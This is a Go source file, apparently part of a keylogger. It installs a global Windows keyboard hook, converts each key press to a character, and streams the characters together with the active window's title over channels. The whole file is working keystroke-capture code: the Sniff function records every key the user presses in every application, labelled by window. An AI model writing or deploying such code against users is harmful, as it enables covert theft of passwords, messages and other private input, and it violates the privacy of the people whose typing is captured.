package windows

import (
	"errors"
	"log"
	"os"
	"syscall"
	"time"
	"unsafe"

	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	win "golang.org/x/sys/windows"
)

const (
	DLL_NAME = "user32.dll"
)

var (
	methods = []string{
		"GetKeyState",
		"GetKeyboardLayout",
		"GetKeyboardState",
		"GetForegroundWindow",
		"ToUnicodeEx",
		"GetWindowTextW",
		"GetWindowTextLengthW",
	}
)

type (
	User32 struct {
		methods []string
		dll     *win.LazyDLL
		procs   map[string]*win.LazyProc
	}
)

func NewUser32() User32 {
	user := User32{
		methods,
		win.NewLazyDLL(DLL_NAME),
		make(map[string]*win.LazyProc, len(methods)),
	}
	user.LoadMethods()
	return user
}

func (u *User32) LoadMethods() error {

	if u.dll == nil {
		return errors.New("not working with a dll")
	}

	for _, method := range methods {
		u.procs[method] = u.dll.NewProc(method)
	}

	return nil
}

func (u *User32) GetWinTextLen(handler uintptr) (int, error) {
	ret, _, err := u.procs["GetWindowTextLengthW"].Call(
		handler,
	)
	return int(ret), err
}

func (u *User32) GetWinText(handler uintptr) (string, error) {
	lenWord, err := u.GetWinTextLen(handler)
	if err != nil {
		return "", err
	}
	lenWord += 1
	buf := make([]uint16, lenWord)
	u.procs["GetWindowTextW"].Call(
		handler,
		uintptr(
			unsafe.Pointer(&buf[0])),
		uintptr(lenWord),
	)

	return syscall.UTF16ToString(buf), nil
}

func (u *User32) GetActiveWindow() (uintptr, error) {
	win, _, err := u.procs["GetForegroundWindow"].Call()
	return win, err
}

func (u *User32) ToRune(key types.KeyboardEvent) rune {
	var (
		buffer []uint16 = make([]uint16, 256)
		kState []byte   = make([]byte, 256)
	)

	n := 10
	n |= (1 << 2)

	u.procs["GetKeyState"].Call(
		uintptr(key.VKCode),
	)

	u.procs["GetKeyboardState"].Call(
		uintptr(unsafe.Pointer(&kState[0])),
	)

	result, _, err := u.procs["GetKeyboardLayout"].Call(0)
	if err != nil {
		return rune(0)
	}

	u.procs["ToUnicodeEx"].Call(
		uintptr(key.VKCode),
		uintptr(key.ScanCode),
		uintptr(unsafe.Pointer(&kState[0])),
		uintptr(unsafe.Pointer(&buffer[0])), 256, uintptr(n),
		result,
	)

	if len(syscall.UTF16ToString(buffer)) > 0 {
		return []rune(syscall.UTF16ToString(buffer))[0]
	}

	return rune(0)
}

func (u *User32) Sniff(
	key chan<- rune,
	window chan<- string,
	signaler <-chan os.Signal,
) error {

	keyboardChan := make(
		chan types.KeyboardEvent, 2000,
	)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}

	defer keyboard.Uninstall()

	log.Println("<<<<<<<<<< start to sniffing keyboard")

	for {
		select {
		case <-signaler:
			log.Println("user wants to scape, let's go pal")
			return nil
		case currentKey := <-keyboardChan:
			if currentWindow, err := u.GetActiveWindow(); currentWindow != 0 && err == nil {
				if currentKey.Message == types.WM_KEYDOWN {
					key <- u.ToRune(currentKey)
					msg, err := u.GetWinText(currentWindow)
					if err != nil {
						log.Println(err)
					} else {
						window <- msg
					}
				}
			} else {
				log.Println("error ...... current window", err)
			}
		case <-time.After(time.Second * 5):
			log.Println("nothing on the keyboard")

		}
	}
}
